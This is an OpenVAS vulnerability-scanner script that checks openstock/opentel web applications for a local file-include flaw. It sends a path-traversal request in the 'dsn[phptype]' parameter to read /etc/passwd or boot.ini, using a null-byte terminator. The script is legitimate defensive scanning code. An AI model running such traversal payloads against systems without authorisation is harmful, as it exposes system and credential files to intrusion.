###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_openstock_39484.nasl 5323 2017-02-17 08:49:23Z teissa $
#
# openstock/opentel 'dsn[phptype]' Parameter Local File Include Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "openstock/opentel is prone to a local file-include vulnerability
because it fails to properly sanitize user supplied input.

An attacker can exploit this vulnerability to obtain potentially
sensitive information and execute arbitrary local scripts in the
context of the webserver process. This may allow the attacker to
compromise the application and the underlying computer; other attacks
are also possible.

openstock facture 2.02 and opentel openmairie tel 1.02 are vulnerable; other
versions may also be affected.";


if (description)
{
 script_id(100578);
 script_version("$Revision: 5323 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-17 09:49:23 +0100 (Fri, 17 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-04-15 19:15:10 +0200 (Thu, 15 Apr 2010)");
 script_bugtraq_id(39484,39486);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("openstock/opentel 'dsn[phptype]' Parameter Local File Include Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39484");
 script_xref(name : "URL" , value : "https://adullact.net/projects/openstock");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs =
make_list("/openstock","/openmairie_stock","/openmairie_Tel","/opentel",cgi_dirs());
files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir,"/scr/soustab.php?dsn[phptype]=../../../../../../../../../../../",files[file],"%00"); 

    if(http_vuln_check(port:port, url:url, pattern:file)) {
     
      security_message(port:port);
      exit(0);

    }
  }  
}

exit(0);
